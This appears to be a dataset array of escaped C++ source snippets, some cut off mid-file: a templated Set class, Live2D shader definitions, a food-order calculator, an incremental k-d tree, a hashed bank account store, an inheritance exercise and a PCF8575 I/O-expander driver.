\u043f\u0430\u043c\u044f\u0442\u0438\n    void memory(){\n        capacity *= 2;\n        T* tmp = array;\n        array = new T[capacity];\n        for (size_t i = 0; i < size; ++i) {\n            array[i] = tmp[i];\n        }\n        delete[] tmp;\n    }\n        \n    // \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438 \u0432\u0432\u043e\u0434\u0430\n   friend ostream& operator << (ostream& out, Set<T>& mySet) {\n        for (size_t i = 0; i < mySet.size; i++) {\n            out << mySet.array[i] << \" \";\n        }\n        return out;\n    }\n\n    // \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438 \u0432\u044b\u0432\u043e\u0434\u0430\n    friend ifstream& operator >> (ifstream& in, const Set<T>& mySet) {\n        for (size_t i = 0; i < mySet.size; i++) {\n            in >> mySet.array[i];\n        }\n        return in;\n    }\n\n    // \u0434\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\n    ~Set() {\n        delete[] array;\n    }\n};\n\nclass Time {\npublic:\n    int minute;\n    int second;\n    // \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\n    Time() {\n        minute = 0;\n        second = 0;\n    }\n\n    Time(const int minute1, const int second1) {\n        minute = minute1;\n        second = second1;\n    }\n    //\u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435\n    Time(const Time& other) {\n        minute = other.minute;\n        second = other.second;\n    }\n\n    //\u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u0435\n    Time(Time&& other){\n        minute = other.minute;\n        second = other.second;\n        other.minute = 0;\n        other.second= 0;\n    }\n    //\u043d\u0430\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435\n    Time& operator=(const Time& other) {\n        if (this != &other) {\n            minute = other.minute;\n            second = other.second;\n        }\n        return *this;\n    }\n\n    // \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u044f \u043d\u0430\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f\n    Time& operator=(Time&& other) {\n        if (this != &other) {\n            minute = other.minute;\n            second = other.second;\n            other.minute = 0;\n            other.second = 0;\n        }\n        return *this;\n    }\n\n    //  \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u044f \u0432\u0432\u043e\u0434\u0430\n    friend ostream& operator << (ostream& out, const Time& value) {\n        out << value.minute << \":\" << value.second;\n        return out;\n    }\n\n    // \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u044f \u0432\u044b\u0432\u043e\u0434\u0430\n    friend istream& operator >> (istream& in, Time& value) {\n        in >> value.minute>> value.second;\n        return in;\n    }\n};\n\n\n\nint main(){\n    setlocale(LC_ALL, \"Russian\");\n    // testing program for container class\n    initializer_list<double>q = {5.5, 15.5};\n    Set<double> mySet1(q);\n    cout << \"\u0412\u0438\u0437\u0443\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u0430: \";\n    cout << mySet1 << \"\\n\";\n    \n    cout << \"\u041f\u0440\u0438\u043d\u0430\u0434\u043b\u0435\u0436\u0438\u0442 \u043b\u0438 \u0447\u0438\u0441\u043b\u043e 5.5 \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u0443(1 - \u043f\u0440\u0438\u043d\u0430\u0434\u043b\u0435\u0436\u0438\u0442, 0 - \u043d\u0435\u0442)? \";\n    cout << mySet1.isInSet(5.5).first << \"\\n\";\n    \n    mySet1.insert(10);\n    cout << \"\u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0432\u043e \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e \u0447\u0438\u0441\u043b\u043e: 10, \u043f\u043e\u043b\u0443\u0447\u0438\u043c: \";\n    cout << mySet1 << \"\\n\";\n\n    mySet1.exclude(10);\n    cout << \"\u0423\u0434\u0430\u043b\u044f\u0435\u043c \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u043d\u044b\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442, \u043f\u043e\u043b\u0443\u0447\u0438\u043c: \";\n    cout << mySet1 << \"\\n\";\n\n    cout << \"\u0420\u0430\u0437\u043c\u0435\u0440 \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u0430: \";\n    cout << mySet1.getSize() << \"\\n\";\n\n    cout << \"\u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u043f\u0443\u0441\u0442\u043e\u0442\u0443, \u0435\u0441\u043b\u0438 \u043f\u0443\u0441\u0442 - 0, \u0432 \u043e\u0431\u0440\u0430\u0442\u043d\u043e\u043c \u0441\u043b\u0443\u0447\u0430\u0435 - 1: \";\n    cout << mySet1.isEmpty() << \"\\n\";\n\n    initializer_list<float>w = {1e4, 1e5};\n    Set<float",
    "\ufeff/**\n * Copyright(c) Live2D Inc. All rights reserved.\n *\n * Use of this source code is governed by the Live2D Open Software license\n * that can be found at https://www.live2d.com/eula/live2d-open-software-license-agreement_en.html.\n */\n\n#include \"CubismShader_OpenGLES2.hpp\"\n#include <float.h>\n#include \"Type/csmRectF.hpp\"\n\n#ifdef CSM_TARGET_WIN_GL\n#include <Windows.h>\n#endif\n\n#define CSM_FRAGMENT_SHADER_FP_PRECISION_HIGH \"highp\"\n#define CSM_FRAGMENT_SHADER_FP_PRECISION_MID \"mediump\"\n#define CSM_FRAGMENT_SHADER_FP_PRECISION_LOW \"lowp\"\n\n#define CSM_FRAGMENT_SHADER_FP_PRECISION CSM_FRAGMENT_SHADER_FP_PRECISION_HIGH\n\n//------------ LIVE2D NAMESPACE ------------\nnamespace Live2D { namespace Cubism { namespace Framework { namespace Rendering {\n\n/*********************************************************************************************************************\n*                                       CubismShader_OpenGLES2\n********************************************************************************************************************/\nnamespace {\n    const csmInt32 ShaderCount = 19; ///< \u30b7\u30a7\u30fc\u30c0\u306e\u6570 = \u30de\u30b9\u30af\u751f\u6210\u7528 + (\u901a\u5e38 + \u52a0\u7b97 + \u4e57\u7b97) * (\u30de\u30b9\u30af\u7121 + \u30de\u30b9\u30af\u6709 + \u30de\u30b9\u30af\u6709\u53cd\u8ee2 + \u30de\u30b9\u30af\u7121\u306e\u4e57\u7b97\u6e08\u30a2\u30eb\u30d5\u30a1\u5bfe\u5fdc\u7248 + \u30de\u30b9\u30af\u6709\u306e\u4e57\u7b97\u6e08\u30a2\u30eb\u30d5\u30a1\u5bfe\u5fdc\u7248 + \u30de\u30b9\u30af\u6709\u53cd\u8ee2\u306e\u4e57\u7b97\u6e08\u30a2\u30eb\u30d5\u30a1\u5bfe\u5fdc\u7248)\n    CubismShader_OpenGLES2* s_instance;\n}\n\nenum ShaderNames\n{\n    // SetupMask\n    ShaderNames_SetupMask,\n\n    //Normal\n    ShaderNames_Normal,\n    ShaderNames_NormalMasked,\n    ShaderNames_NormalMaskedInverted,\n    ShaderNames_NormalPremultipliedAlpha,\n    ShaderNames_NormalMaskedPremultipliedAlpha,\n    ShaderNames_NormalMaskedInvertedPremultipliedAlpha,\n\n    //Add\n    ShaderNames_Add,\n    ShaderNames_AddMasked,\n    ShaderNames_AddMaskedInverted,\n    ShaderNames_AddPremultipliedAlpha,\n    ShaderNames_AddMaskedPremultipliedAlpha,\n    ShaderNames_AddMaskedPremultipliedAlphaInverted,\n\n    //Mult\n    ShaderNames_Mult,\n    ShaderNames_MultMasked,\n    ShaderNames_MultMaskedInverted,\n    ShaderNames_MultPremultipliedAlpha,\n    ShaderNames_MultMaskedPremultipliedAlpha,\n    ShaderNames_MultMaskedPremultipliedAlphaInverted,\n};\n\n// SetupMask\nstatic const csmChar* VertShaderSrcSetupMask =\n#if defined(CSM_TARGET_IPHONE_ES2) || defined(CSM_TARGET_ANDROID_ES2)\n        \"#version 100\\n\"\n#else\n        \"#version 120\\n\"\n#endif\n        \"attribute vec4 a_position;\"\n        \"attribute vec2 a_texCoord;\"\n        \"varying vec2 v_texCoord;\"\n        \"varying vec4 v_myPos;\"\n        \"uniform mat4 u_clipMatrix;\"\n        \"void main()\"\n        \"{\"\n        \"gl_Position = u_clipMatrix * a_position;\"\n        \"v_myPos = u_clipMatrix * a_position;\"\n        \"v_texCoord = a_texCoord;\"\n        \"v_texCoord.y = 1.0 - v_texCoord.y;\"\n        \"}\";\nstatic const csmChar* FragShaderSrcSetupMask =\n#if defined(CSM_TARGET_IPHONE_ES2) || defined(CSM_TARGET_ANDROID_ES2)\n        \"#version 100\\n\"\n        \"precision \" CSM_FRAGMENT_SHADER_FP_PRECISION \" float;\"\n#else\n        \"#version 120\\n\"\n#endif\n        \"varying vec2 v_texCoord;\"\n        \"varying vec4 v_myPos;\"\n        \"uniform sampler2D s_texture0;\"\n        \"uniform vec4 u_channelFlag;\"\n        \"uniform vec4 u_baseColor;\"\n        \"void main()\"\n        \"{\"\n        \"float isInside = \"\n        \"  step(u_baseColor.x, v_myPos.x/v_myPos.w)\"\n        \"* step(u_baseColor.y, v_myPos.y/v_myPos.w)\"\n        \"* step(v_myPos.x/v_myPos.w, u_baseColor.z)\"\n        \"* step(v_myPos.y/v_myPos.w, u_baseColor.w);\"\n\n        \"gl_FragColor = u_channelFlag * texture2D(s_texture0 , v_texCoord).a * isInside;\"\n        \"}\";\n#if defined(CSM_TARGET_ANDROID_ES2)\nstatic const csmChar* FragShaderSrcSetupMaskTegra =\n        \"#version 100\\n\"\n        \"#extension GL_NV_shader_framebuffer_fetch : enable\\n\"\n        \"precision \" CSM_FRAGMENT_SHADER_FP_PRECISION \" float;\"\n        \"varying vec2 v_texCoord;\"\n        \"varying vec4 v_myPos;\"\n        \"uniform sampler2D s_texture0;\"\n        \"uniform vec4 u_channelFlag;\"\n        \"uniform vec4 u_baseColor;\"\n        \"void main()\"\n        \"{\"\n        \"float isInside = \"\n        \"  step(u_baseColor.x, v_myPos.x/v_myPos.w)\"\n        \"* step(u_baseColor.y, v_myPos.y/v_myPos.w)\"\n        \"* step(v_myPos.x/v_myPos.w, u_baseColor.z)\"\n        \"* step(v_myPos.y/v_myPos.w, u_baseColor.w);\"\n\n        \"gl_FragColor = u_channelFlag * texture2D(s_texture0 , v_texCoord).a * isInside;\"\n        \"}\";\n#endif\n\n//----- \u30d0\u30fc\u30c6\u30c3\u30af\u30b9\u30b7\u30a7\u30fc\u30c0\u30d7\u30ed\u30b0\u30e9\u30e0 -----\n// Normal & Add & Mult \u5171\u901a\nstatic const csmChar* VertShaderSrc =\n#if defined(CSM_TARGET_IPHONE_ES2) || defined(CSM_TARGET_ANDROID_ES2)\n        \"#version 100\\n\"\n#else\n        \"#version 120\\n\"\n#endif\n        \"attribute vec4 a_position;\" //v.vertex\n        \"attribute vec2 a_texCoord;\" //v.texcoord\n        \"varying vec2 v_texCoord;\" //v2f.texcoord\n        \"uniform mat4 u_matrix;\"\n        \"void main()\"\n        \"{\"\n        \"gl_Position = u_matrix * a_position;\"\n        \"v_texCoord = a_texCoord;\"\n        \"v_texCoord.y = 1.0 - v_texCoord.y;\"\n        \"}\";\n\n// Normal & Add & Mult \u5171\u901a\uff08\u30af\u30ea\u30c3\u30d4\u30f3\u30b0\u3055\u308c\u305f\u3082\u306e\u306e\u63cf\u753b\u7528\uff09\nstatic const csmChar* VertShaderSrcMasked =\n#if defined(CSM_TARGET_IPHONE_ES2) || defined(CSM_TARGET_ANDROID_ES2)\n     ",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\n\r\nstring daftarPesanan[99];\r\nint panjangPesanan = 0;\r\n\r\nvoid pisahKata(string str, char seperator)\r\n{\r\n    int currIndex = 0, i = 0;\r\n    int startIndex = 0, endIndex = 0;\r\n    while (i <= str.length())\r\n    {\r\n        if (str[i] == seperator || i == str.length())\r\n        {\r\n            endIndex = i;\r\n            string subStr = \"\";\r\n            subStr.append(str, startIndex, endIndex - startIndex);\r\n            daftarPesanan[currIndex] = subStr;\r\n            currIndex += 1;\r\n            startIndex = endIndex + 1;\r\n            panjangPesanan++;\r\n        }\r\n        i++;\r\n    }\r\n}\r\n\r\nint cariIndex(string str[], string teks)\r\n{\r\n    int index = 0;\r\n    for (int i = 0; i < 5; i++)\r\n    {\r\n        if (str[i] == teks)\r\n        {\r\n            index = i;\r\n            break;\r\n        }\r\n    }\r\n    return index;\r\n}\r\n\r\nint main()\r\n{\r\n    string daftarMakanan[5] = {\"Soto\", \"Rawon\", \"Pecel\", \"Bakso\", \"Siomay\"};\r\n    int hargaMakanan[5] = {15000, 20000, 10000, 12500, 25000};\r\n    string masukkan;\r\n    int posisi, totalHarga = 0;\r\n    getline(cin, masukkan);\r\n    pisahKata(masukkan, ' ');\r\n    cout << \"Total Harga : \" << endl;\r\n    for (int i = 0; i < panjangPesanan; i++)\r\n    {\r\n        if (i % 2 == 0)\r\n        {\r\n            cout << \"\\t(\\xfb) \" << daftarPesanan[i];\r\n            posisi = cariIndex(daftarMakanan, daftarPesanan[i]);\r\n        }\r\n        else\r\n        {\r\n            cout << \" @\" << hargaMakanan[posisi] << \" * \" << daftarPesanan[i] << \" = \" << hargaMakanan[posisi] * stoi(daftarPesanan[i]) << endl;\r\n            totalHarga += hargaMakanan[posisi] * stoi(daftarPesanan[i]);\r\n        }\r\n    }\r\n    cout << \"Total = \" << totalHarga;\r\n\r\n    return 0;\r\n}",
    "#include \"ikd_Tree.h\"\n\n/*\nDescription: ikd-Tree: an incremental k-d tree for robotic applications \nAuthor: Yixi Cai\nemail: yixicai@connect.hku.hk\n*/\n\ntemplate <typename PointType>\nKD_TREE<PointType>::KD_TREE(float delete_param, float balance_param, float box_length)\n{\n    delete_criterion_param = delete_param;\n    balance_criterion_param = balance_param;\n    downsample_size = box_length;\n    Rebuild_Logger.clear();\n    termination_flag = false;\n    start_thread();\n}\n\ntemplate <typename PointType>\nKD_TREE<PointType>::~KD_TREE()\n{\n    stop_thread();\n    Delete_Storage_Disabled = true;\n    delete_tree_nodes(&Root_Node);\n    PointVector().swap(PCL_Storage);\n    Rebuild_Logger.clear();\n}\n\n\n\ntemplate <typename PointType>\nvoid KD_TREE<PointType>::InitializeKDTree(float delete_param, float balance_param, float box_length)\n{\n    Set_delete_criterion_param(delete_param);\n    Set_balance_criterion_param(balance_param);\n    set_downsample_param(box_length);\n}\n\ntemplate <typename PointType>\nvoid KD_TREE<PointType>::InitTreeNode(KD_TREE_NODE *root)\n{\n    root->point.x = 0.0f;\n    root->point.y = 0.0f;\n    root->point.z = 0.0f;\n    root->node_range_x[0] = 0.0f;\n    root->node_range_x[1] = 0.0f;\n    root->node_range_y[0] = 0.0f;\n    root->node_range_y[1] = 0.0f;\n    root->node_range_z[0] = 0.0f;\n    root->node_range_z[1] = 0.0f;\n    root->radius_sq = 0.0f;\n    root->division_axis = 0;\n    root->father_ptr = nullptr;\n    root->left_son_ptr = nullptr;\n    root->right_son_ptr = nullptr;\n    root->TreeSize = 0;\n    root->invalid_point_num = 0;\n    root->down_del_num = 0;\n    root->point_deleted = false;\n    root->tree_deleted = false;\n    root->need_push_down_to_left = false;\n    root->need_push_down_to_right = false;\n    root->point_downsample_deleted = false;\n    root->working_flag = false;\n    pthread_mutex_init(&(root->push_down_mutex_lock), NULL);\n}\n\ntemplate <typename PointType>\nint KD_TREE<PointType>::size()\n{\n    int s = 0;\n    if (Rebuild_Ptr == nullptr || *Rebuild_Ptr != Root_Node)\n    {\n        if (Root_Node != nullptr)\n        {\n            return Root_Node->TreeSize;\n        }\n        else\n        {\n            return 0;\n        }\n    }\n    else\n    {\n        if (!pthread_mutex_trylock(&working_flag_mutex))\n        {\n            s = Root_Node->TreeSize;\n            pthread_mutex_unlock(&working_flag_mutex);\n            return s;\n        }\n        else\n        {\n            return Treesize_tmp;\n        }\n    }\n}\n\ntemplate <typename PointType>\nBoxPointType KD_TREE<PointType>::tree_range()\n{\n    BoxPointType range;\n    if (Rebuild_Ptr == nullptr || *Rebuild_Ptr != Root_Node)\n    {\n        if (Root_Node != nullptr)\n        {\n            range.vertex_min[0] = Root_Node->node_range_x[0];\n            range.vertex_min[1] = Root_Node->node_range_y[0];\n            range.vertex_min[2] = Root_Node->node_range_z[0];\n            range.vertex_max[0] = Root_Node->node_range_x[1];\n            range.vertex_max[1] = Root_Node->node_range_y[1];\n            range.vertex_max[2] = Root_Node->node_range_z[1];\n        }\n        else\n        {\n            memset(&range, 0, sizeof(range));\n        }\n    }\n    else\n    {\n        if (!pthread_mutex_trylock(&working_flag_mutex))\n        {\n            range.vertex_min[0] = Root_Node->node_range_x[0];\n            range.vertex_min[1] = Root_Node->node_range_y[0];\n            range.vertex_min[2] = Root_Node->node_range_z[0];\n            range.vertex_max[0] = Root_Node->node_range_x[1];\n            range.vertex_max[1] = Root_Node->node_range_y[1];\n            range.vertex_max[2] = Root_Node->node_range_z[1];\n            pthread_mutex_unlock(&working_flag_mutex);\n        }\n        else\n        {\n            memset(&range, 0, sizeof(range));\n        }\n    }\n    return range;\n}\n\ntemplate <typename PointType>\nint KD_TREE<PointType>::validnum()\n{\n    int s = 0;\n    if (Rebuild_Ptr == nullptr || *Rebuild_Ptr != Root_Node)\n    {\n        if (Root_Node != nullptr)\n            return (Root_Node->TreeSize - Root_Node->invalid_point_num);\n        else\n            return 0;\n    }\n    else\n    {\n        if (!pthread_mutex_trylock(&working_flag_mutex))\n        {\n            s = Root_Node->TreeSize - Root_Node->invalid_point_num;\n            pthread_mutex_unlock(&working_flag_mutex);\n            return s;\n        }\n        else\n        {\n            return -1;\n        }\n    }\n}\n\ntemplate <typename PointType>\nvoid KD_TREE<PointType>::root_alpha(float &alpha_bal, float &alpha_del)\n{\n    if (Rebuild_Ptr == nullptr || *Rebuild_Ptr != Root_Node)\n    {\n        alpha_bal = Root_Node->alpha_bal;\n        alpha_del = Root_Node->alpha_del;\n        return;\n    }\n    else\n    {\n        if (!pthread_mutex_trylock(&working_flag_mutex))\n        {\n            alpha_bal = Root_Node->alpha_bal;\n            alpha_del = Root_Node->alpha_del;\n            pthread_mutex_unlock(&working_flag_mutex);\n            return;\n        }\n        else\n        {\n            alpha_bal = alpha_bal_tmp;\n            alpha_del = alpha_del_tmp;\n          ",
    "#include \"Comp.h\"\n\nvoid Comp::createAccount(std::string id, int count) {\n    int index = hash(id);\n    Account account;\n    account.id = id;\n    account.balance = count;\n\n    while (bankStorage2d.size() <= index) {\n        bankStorage2d.push_back(std::vector<Account>());\n    }\n\n    bankStorage2d[index].push_back(account);\n}\n\nstd::vector<int> Comp::getTopK(int k) {\n    std::vector<int> topBalances;\n\n    for (size_t i = 0; i < bankStorage2d.size(); ++i) {\n        for (size_t j = 0; j < bankStorage2d[i].size(); ++j) {\n            if (topBalances.size() < k) {\n                topBalances.push_back(bankStorage2d[i][j].balance);\n            } else {\n                int minBalance = topBalances[0];\n                int minIndex = 0;\n\n                for (int l = 1; l < k; ++l) {\n                    if (topBalances[l] < minBalance) {\n                        minBalance = topBalances[l];\n                        minIndex = l;\n                    }\n                }\n\n                if (bankStorage2d[i][j].balance > minBalance) {\n                    topBalances[minIndex] = bankStorage2d[i][j].balance;\n                }\n            }\n        }\n    }\n\n    for (size_t i = 0; i < k - 1; ++i) {\n        int maxIndex = i;\n        for (size_t j = i + 1; j < k; ++j) {\n            if (topBalances[j] > topBalances[maxIndex]) {\n                maxIndex = j;\n            }\n        }\n        if (maxIndex != i) {\n            std::swap(topBalances[i], topBalances[maxIndex]);\n        }\n    }\n\n    return topBalances;\n}\n\nint Comp::getBalance(std::string id) {\n    int index = hash(id);\n    if (index >= 0 && index < bankStorage2d.size()) {\n        for (size_t i = 0; i < bankStorage2d[index].size(); ++i) {\n            if (bankStorage2d[index][i].id == id) {\n                return bankStorage2d[index][i].balance;\n            }\n        }\n    }\n    return -1;\n}\n\nvoid Comp::addTransaction(std::string id, int count) {\n    int index = hash(id);\n    if (index >= 0 && index < bankStorage2d.size()) {\n        for (size_t i = 0; i < bankStorage2d[index].size(); ++i) {\n            if (bankStorage2d[index][i].id == id) {\n                bankStorage2d[index][i].balance += count;\n                return;\n            }\n        }\n    }\n    createAccount(id, count);\n}\n\nbool Comp::doesExist(std::string id) {\n    int index = hash(id);\n    if (index >= 0 && index < bankStorage2d.size()) {\n        for (size_t i = 0; i < bankStorage2d[index].size(); ++i) {\n            if (bankStorage2d[index][i].id == id) {\n                return true;\n            }\n        }\n    }\n    return false;\n}\n\nbool Comp::deleteAccount(std::string id) {\n    int index = hash(id);\n    if (index >= 0 && static_cast<size_t>(index) < bankStorage2d.size()) {\n        for (size_t i = 0; i < bankStorage2d[static_cast<size_t>(index)].size(); i++) {\n            if (bankStorage2d[static_cast<size_t>(index)][i].id == id) {\n                bankStorage2d[static_cast<size_t>(index)].erase(bankStorage2d[static_cast<size_t>(index)].begin() + i);\n                return true;\n            }\n        }\n    }\n    return false;\n}\n\nint Comp::databaseSize() {\n    int size = 0;\n    for (size_t i = 0; i < bankStorage2d.size(); ++i) {\n        size += bankStorage2d[i].size();\n    }\n    return size;\n}\n\nint Comp::hash(std::string id) {\n    unsigned long long hashValue = 0;\n    const int prime = 31;\n    for (size_t i = 0; i < id.length(); i++) {\n        hashValue = (hashValue * prime + static_cast<int>(id[i])) % 100003;\n    }\n    return static_cast<int>(hashValue);\n}\n",
    "\ufeff// Inheritance\n#include <iostream>\n#include<string>\nusing namespace std;\n\n#define delimiter \"----------------------------------------\"\n\nclass Human\n{\n\tstd::string last_name;\n\tstd::string first_name;\n\tint age;\n\npublic:\n\tconst std::string& get_last_name()const { return last_name; }\n\tconst std::string& get_first_name()const { return first_name; }\n\tint get_age()const { return age; }\n\n\tvoid set_last_name(const std::string& last_name) { this->last_name = last_name; }\n\tvoid set_first_name(const std::string& first_name) { this->first_name = first_name; }\n\tvoid set_age(int age) { this->age = age; }\n\n\t// Constructors\n\tHuman(const std::string& last_name, const std::string& first_name, int age)\n\t{\n\t\tset_last_name(last_name);\n\t\tset_first_name(first_name);\n\t\tset_age(age);\n\n\t\tcout << \"HumanConstructor:\\t\" << endl;\n\t}\n\n\tvirtual ~Human()\n\t{\n\t\tcout << \"HumanDestructor:\\t\" << endl;\n\t}\n\n\t// Methods\n\tvirtual void print()\n\t{\n\t\tcout << last_name << \" \" << first_name << \" \" << age << \" years\" << \" \";\n\t}\n};\n\n\nclass Student :public Human\n{\n\tstd::string speciality;\n\tstd::string group;\n\tdouble rating; // \u0443\u0441\u043f\u0435\u0432\u0430\u0435\u043c\u043e\u0441\u0442\u044c\n\tdouble attendance; // \u043f\u043e\u0441\u0435\u0449\u0430\u0435\u043c\u043e\u0441\u0442\u044c\n\npublic:\n\tconst std::string& get_speciality()const {return speciality;}\n\tconst std::string& get_groop()const {return group;}\n\tdouble get_rating()const {return rating;}\n\tdouble get_attendance()const {return attendance;}\n\n\tvoid set_speciality(const std::string& speciality) {this->speciality = speciality;}\n\tvoid set_group(const std::string& group) {this->group = group;}\n\tvoid set_rating(double rating) {this->rating = rating;}\n\tvoid set_attendance(double attendance) {this->attendance = attendance;}\n\n\t// Constructors\n\tStudent(\n\t\tconst std::string& last_name, const std::string& first_name, int age, \n\t\tconst std::string& speciality, const std::string& group, double rating, double attendance\n\t):Human(last_name, first_name, age)\n\t{\n\t\tset_speciality(speciality);\n\t\tset_group(group);\n\t\tset_rating(rating);\n\t\tset_attendance(attendance);\n\n\t\tcout << \"StudentConstructor:\\t\" << endl;\n\t}\n\n\t~Student()\n\t{\n\t\tcout << \"StudentDestructor:\\t\" << endl;\n\t}\n\n\t// Methods\n\tvoid print()\n\t{\n\t\tHuman::print();\n\t\tcout << speciality << \" \" << group << \" \" << rating << \" \" << attendance << \" \";\n\t}\n};\n\nclass Teacher :public Human\n{\n\tstd::string speciality;\n\tint experience;\n\npublic:\n\tconst std::string& get_speciality()const { return speciality; }\n\tdouble get_experience()const { return experience; }\n\n\tvoid set_speciality(const std::string speciality) {this->speciality = speciality;}\n\tvoid set_experience(int experience) {this->experience = experience;}\n\n\t// Constructors\n\n\tTeacher\n\t(const std::string& last_name, const std::string& first_name, int age,\n\t\tconst std::string& speciality, int experience\n\t) :Human(last_name, first_name, age)\n\t{\n\t\tset_speciality(speciality);\n\t\tset_experience(experience);\n\n\t\tcout << \"TeacherConstructor:\\t\" << endl;\n\t}\n\n\t~Teacher()\n\t{\n\t\tcout << \"TeacherDestructor:\\t\" << endl;\n\t}\n\n\t//Methods\n\tvoid print()\n\t{\n\t\tHuman::print();\n\t\tcout << speciality << \" \" << experience << \" \";\n\t}\n};\n\nclass Graduate :public Student\n{\n\tstd::string subject;\n\npublic:\n\tconst std::string& grt_subject()const { return subject; }\n\n\tvoid set_subject(const std::string& subject) {this->subject= subject;}\n\n\t//Constructors\n\tGraduate\n\t\t(const std::string& last_name, const std::string& first_name, int age,\n\t\t\tconst std::string& speciality, const std::string& group, double rating, double attendance,\n\t\t\tstd::string subject\n\t\t) :Student(last_name, first_name, age, speciality, group,rating, attendance)\n\t{\n\t\tset_subject(subject);\n\t\tcout << \"GraduateConstructor:\\t\" << endl;\n\t}\n\n\t~Graduate()\n\t{\n\t\tcout << \"GraduateDestructor:\\t\" << endl;\n\t}\n\n\t//Methods\n\tvoid print()\n\t{\n\t\tStudent::print();\n\t\tcout << subject << \" \";\n\t}\n};\n\n//#define INHERITANCE_CHECK\n\nvoid main()\n{\n\tsetlocale(LC_ALL, \"\");\n\n#if defined INHERITANCE_CHECK\n\tHuman human(\"Pain\", \"Max\", 30);\n\thuman.print();\n\tcout << endl << endl;\n\n\tStudent student(\"Pinkman\", \"Jessie\", 20, \"Chemistry\", \"WW_220\", 95, 97);\n\tstudent.print();\n\tcout << endl << endl;\n\n\tTeacher teacher(\"Green\", \"Walter\", 50, \"Chemistry\", 25);\n\tteacher.print();\n\tcout << endl << endl;\n\n\tGraduate graduate(\"Cristoff\", \"Brain\", 20, \"Alchohol\", \"WD_320\", 95, 97, \"How to catch Alchohol\");\n\tgraduate.print();\n\tcout << endl << endl;\n#endif\n\n\t// Generalization \n\n\tHuman* group[] =\n\t{\n\t\tnew Student(\"Pinkman\", \"Jessie\", 20, \"Chemistry\", \"WW_220\", 95, 97),\n\t\tnew Teacher(\"White\", \"Walter\", 50, \"Chemistry\", 25),\n\t\tnew Graduate(\"Cristoff\", \"Brain\", 20, \"Alchohol\", \"WD_320\", 95, 97, \"How to catch Alchohol\"),\n\t\tnew Student(\"Vercetty\", \"Tommy\", 30, \"Theft\", \"Vice\", 98, 95),\n\t\tnew Teacher(\"Diza\", \"Ricardo\", 50, \"Weapons\", 20)\n\t};\n\n\n\tfor (int i = 0; i < sizeof(group) / sizeof(group[0]); i++)\n\t{\n\t\tgroup[i]->print();\n\t\tcout << endl;\n\t\tcout << delimiter << endl;\n\t}\n\n\tfor (int i = 0; i < sizeof(group) / sizeof(group[0]); i++)\n\t{\n\t\tdelete group[i];\n\t}\n\n}",
    "/*\n * PCF8575 GPIO Port Expand\n * https://www.mischianti.org/\n *\n * The MIT License (MIT)\n *\n * Copyright (c) 2019 Renzo Mischianti www.mischianti.org All right reserved.\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\n\n#include \"PCF8575.h\"\n#include <Wire.h>\n\nPCF8575::PCF8575(){\n\n};\n\n/**\n * Constructor\n * @param address: i2c address\n */\nPCF8575::PCF8575(uint8_t address, TwoWire *wire){\n\t_address = address;\n\t_wire = wire;\n};\n\n/**\n * Construcor\n * @param address: i2c address\n * @param interruptPin: pin to set interrupt\n * @param interruptFunction: function to call when interrupt raised\n */\nPCF8575::PCF8575(uint8_t address, uint8_t interruptPin,  void (*interruptFunction)() ){\n\t//_wire = &Wire;\n\n\t_address = address;\n\t_interruptPin = interruptPin;\n\t_interruptFunction = interruptFunction;\n\t_usingInterrupt = true;\n};\n\n\n\n/**\n * Set if fin is OUTPUT or INPUT\n * @param pin: pin to set\n * @param mode: mode, supported only INPUT or OUTPUT (to semplify)\n */\nvoid PCF8575::pinMode(uint8_t pin, uint8_t mode){\n\tDEBUG_PRINT(\"Set pin \");\n\tDEBUG_PRINT(pin);\n\tDEBUG_PRINT(\" as \");\n\tDEBUG_PRINTLN(mode);\n\n\tif (mode == OUTPUT){\n\t\twriteMode = writeMode | bit(pin);\n\t\treadMode =  readMode & ~bit(pin);\n//\t\tDEBUG_PRINT(\"writeMode: \");\n//\t\tDEBUG_PRINT(writeMode, BIN);\n//\t\tDEBUG_PRINT(\"readMode: \");\n//\t\tDEBUG_PRINTLN(readMode, BIN);\n\n\t}else if (mode == INPUT){\n\t\twriteMode = writeMode & ~bit(pin);\n\t\treadMode =   readMode | bit(pin);\n//\t\tDEBUG_PRINT(\"writeMode: \");\n//\t\tDEBUG_PRINT(writeMode, BIN);\n//\t\tDEBUG_PRINT(\"readMode: 